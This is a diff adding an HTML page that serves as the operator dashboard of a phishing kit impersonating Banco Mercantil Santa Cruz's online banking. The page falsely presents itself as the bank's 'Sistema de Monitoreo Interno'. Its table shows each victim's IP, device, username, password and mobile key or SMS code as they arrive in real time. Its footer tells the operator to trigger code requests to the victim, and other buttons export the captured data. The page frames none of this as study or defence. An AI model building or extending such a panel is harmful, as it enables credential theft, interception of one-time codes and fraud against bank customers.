@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>BMSC — Panel de Operador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <link rel="shortcut icon" href="/img/favicon.svg" type="image/svg+xml" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/panel/css/panel.css" />
+</head>
+<body>
+  <div class="dash-wrapper">
+    <header class="navbar">
+      <div class="navbar-brand">
+        <img src="https://www.bmsc.com.bo/_nuxt/img/header-logo.96143ea.svg" alt="Mercantil Santa Cruz" class="brand-logo" />
+        <div class="brand-title">
+          <h1>Panel de Control de Operaciones</h1>
+          <span class="brand-subtitle">Banca por Internet · BMSC</span>
+        </div>
+      </div>
+      
+      <div class="navbar-stats">
+        <div class="stat-pill" title="Sesiones registradas hoy">
+          <span class="stat-label">Total:</span>
+          <strong id="statTotal" class="stat-val">0</strong>
+        </div>
+        <div class="stat-pill stat-pill--online" title="Usuarios conectados actualmente">
+          <span class="stat-dot"></span>
+          <span class="stat-label">En línea:</span>
+          <strong id="statOnline" class="stat-val">0</strong>
+        </div>
+        <div class="stat-pill stat-pill--wait" title="Usuarios esperando acción">
+          <span class="stat-label">En espera:</span>
+          <strong id="statWaiting" class="stat-val">0</strong>
+        </div>
+      </div>
+
+      <div class="navbar-actions">
+        <button type="button" class="btn btn-audio" id="audioToggle" aria-pressed="true" title="Activar o desactivar alertas de sonido">
+          🔊 Sonido: ON
+        </button>
+        <button type="button" class="btn btn-clean" id="btnClean" title="Limpiar todas las sesiones">
+          Limpiar
+        </button>
+        <button type="button" class="btn btn-export" id="btnExport" title="Descargar reporte en bloc de notas">
+          Guardar TXT
+        </button>
+        <a class="btn btn-portal" href="/banca-por-internet" target="_blank" title="Abrir portal de Banca por Internet">
+          Ir a Banca
+        </a>
+      </div>
+    </header>
+
+    <div class="filter-bar">
+      <div class="filter-lanes">
+        <span class="filter-label">Filtrar por carril:</span>
+        <button type="button" class="lane-tab is-active" data-filter="all">Todos (<span id="countAll">0</span>)</button>
+        <button type="button" class="lane-tab lane-tab--1" data-filter="0">Azul (<span id="countLane0">0</span>)</button>
+        <button type="button" class="lane-tab lane-tab--2" data-filter="1">Verde (<span id="countLane1">0</span>)</button>
+        <button type="button" class="lane-tab lane-tab--3" data-filter="2">Rojo (<span id="countLane2">0</span>)</button>
+        <button type="button" class="lane-tab lane-tab--4" data-filter="3">Gris (<span id="countLane3">0</span>)</button>
+        <button type="button" class="lane-tab lane-tab--5" data-filter="4">Amarillo (<span id="countLane4">0</span>)</button>
+      </div>
+      <div class="server-status" id="serverStatus">
+        <span class="status-indicator live"></span>
+        <span id="statusText">En vivo</span>
+      </div>
+    </div>
+
+    <div class="empty-state is-visible" id="emptyState">
+      <div class="empty-icon">📥</div>
+      <h3>Cola de espera vacía</h3>
+      <p>Cuando un cliente ingrese su usuario y contraseña en <strong>Banca por Internet</strong>, aparecerá aquí en tiempo real.</p>
+    </div>
+
+    <div class="table-container" id="tableContainer">
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th class="th-num">#</th>
+            <th class="th-time">Hora</th>
+            <th class="th-lane">Carril</th>
+            <th class="th-device">Dispositivo</th>
+            <th class="th-ip">IP</th>
+            <th class="th-user">Usuario</th>
+            <th class="th-pass">Contraseña</th>
+            <th class="th-token">Clave Móvil / SMS</th>
+            <th class="th-online">Conexión</th>
+            <th class="th-state">Estado</th>
+            <th class="th-actions">Acciones del Operador</th>
+          </tr>
+        </thead>
+        <tbody id="sessionsTbody"></tbody>
+      </table>
+    </div>
+
+    <footer class="dash-footer">
+      <span id="footerNote">Listo para recibir sesiones. Pulsa "Clave Móvil" o "SMS" para solicitar verificación al cliente.</span>
+      <span class="footer-copy">Banco Mercantil Santa Cruz S.A. · Sistema de Monitoreo Interno</span>
+    </footer>
+  </div>
+
+  <script src="/panel/js/panel.js"></script>
+</body>
+</html>
